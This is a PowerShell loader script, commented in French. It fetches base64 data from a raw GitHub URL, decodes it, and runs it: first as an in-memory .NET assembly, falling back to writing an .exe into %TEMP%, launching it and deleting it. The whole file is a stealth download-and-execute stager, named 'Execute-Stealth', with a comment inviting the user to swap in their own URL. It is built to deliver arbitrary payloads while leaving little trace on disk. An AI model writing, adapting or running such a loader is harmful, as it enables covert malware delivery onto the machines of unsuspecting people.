[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    $assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)

    $entryPoint = $assembly.EntryPoint
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @())
    }
}

function Execute-Native {
    param (
        [byte[]]$bytes
    )
    
    # Creer un fichier temporaire dans %TEMP%
    $tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "temp_" + [System.Guid]::NewGuid().ToString() + ".exe")
    
    try {
        # Ecrire l'exe sur le disque
        [System.IO.File]::WriteAllBytes($tempPath, $bytes)
        
        # Executer l'exe
        Start-Process -FilePath $tempPath -NoNewWindow
        
        # Attendre un peu pour que le processus demarre
        Start-Sleep -Seconds 2
        
        # Supprimer le fichier temporaire (optionnel, peut echouer si l'exe est en cours)
        try {
            Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
        } catch {
            # Ignorer l'erreur si le fichier est verrouille
        }
    }
    catch {
        Write-Host "Erreur lors de l'execution: $_" -ForegroundColor Red
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    
    # Essayer d'abord Execute-InMemory (pour les .NET assemblies)
    try {
        Execute-InMemory -bytes $bytes
    }
    catch {
        # Si ca echoue (EXE natif), utiliser Execute-Native
        Execute-Native -bytes $bytes
    }

    if ($bytes -ne $null) {
        [Array]::Clear($bytes, 0, $bytes.Length)
    }
}

# REMPLACER PAR TON URL GITHUB
$url = "https://raw.githubusercontent.com/thegoatofapi/myl/refs/heads/main/file.txt"

Execute-Stealth -url $url
